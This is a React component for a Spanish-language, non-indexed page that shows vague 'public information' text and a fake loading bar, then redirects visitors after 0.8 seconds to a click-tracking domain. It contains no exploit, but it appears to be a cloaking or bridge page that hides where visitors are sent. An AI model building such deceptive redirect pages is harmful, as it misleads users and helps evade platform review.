import React, { useEffect, useState } from 'react';
import { Loader } from './components/Loader';
import { Header } from './components/Header';
import { Footer } from './components/Footer';

export default function App() {
  const [progress, setProgress] = useState(0);

  useEffect(() => {
    // Установка title
    document.title = 'Welcome';
    
    // Установка мета-тегов (оптимизировано)
    const metaTags = [
      { name: 'robots', content: 'noindex,nofollow' },
      { property: 'og:title', content: 'Información pública y acceso autorizado' },
      { property: 'og:description', content: 'Página informativa sobre requisitos legales y términos de servicio.' },
      { property: 'og:type', content: 'website' },
      { property: 'og:locale', content: 'es_CL' }
    ];
    
    const createdMetas = metaTags.map(tag => {
      const meta = document.createElement('meta');
      if (tag.name) {
        meta.name = tag.name;
      } else if (tag.property) {
        meta.setAttribute('property', tag.property);
      }
      meta.content = tag.content;
      document.head.appendChild(meta);
      return meta;
    });

    // Симуляция прогресса загрузки (оптимизировано для слабых устройств: 40ms вместо 20ms)
    const progressInterval = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 100) {
          clearInterval(progressInterval);
          return 100;
        }
        return prev + 5; // Увеличен шаг для меньшего количества обновлений
      });
    }, 40); // Уменьшена частота обновлений для экономии ресурсов

    // Автоматический редирект через 0.8 секунды
    const redirectTimer = setTimeout(() => {
      window.location.href = "https://cl-go.click-track.online/";
    }, 800);

    return () => {
      clearInterval(progressInterval);
      clearTimeout(redirectTimer);
      // Очистка мета-тегов
      createdMetas.forEach(meta => {
        if (document.head.contains(meta)) {
          document.head.removeChild(meta);
        }
      });
    };
  }, []);

  return (
    <div className="min-h-screen flex flex-col" style={{ backgroundColor: '#F5F7FA' }}>
      <Header />
      
      <main className="flex-1 flex flex-col items-center justify-center px-4 sm:px-6 lg:px-8">
        <div className="max-w-2xl w-full text-center space-y-6 sm:space-y-8 -mt-16">
          {/* H1 - Заголовок */}
          <h1 
            className="text-2xl sm:text-3xl lg:text-4xl"
            style={{ color: '#111111' }}
          >
            Acceso a información general
          </h1>

          {/* H2 - Подзаголовок */}
          <div 
            className="text-base sm:text-lg"
            style={{ color: '#444444', lineHeight: '1.4' }}
          >
            <p>
              Esta sección ofrece datos públicos y generales del proyecto.
            </p>
            <p>
              Serás dirigido automáticamente al área correspondiente.
            </p>
          </div>

          {/* Прогресс-индикатор */}
          <div className="py-6 sm:py-8">
            <Loader progress={progress} />
          </div>

          {/* Body - Информационный блок */}
          <div 
            className="space-y-3 text-sm sm:text-base"
            style={{ color: '#444444' }}
          >
            <p className="leading-relaxed">
              Si estás viendo esta página, significa que el sistema está gestionando tu acceso.
            </p>
            <p className="leading-relaxed">
              En unos instantes serás trasladado a la sección correcta del proyecto A.
            </p>
          </div>
        </div>
      </main>

      {/* Микро-пояснение */}
      <div className="px-4 sm:px-6 lg:px-8 pb-4">
        <p 
          className="text-center text-xs sm:text-sm"
          style={{ color: '#777777' }}
        >
          Esta página forma parte del sistema de navegación interna del Proyecto A.
        </p>
      </div>

      <Footer />
    </div>
  );
}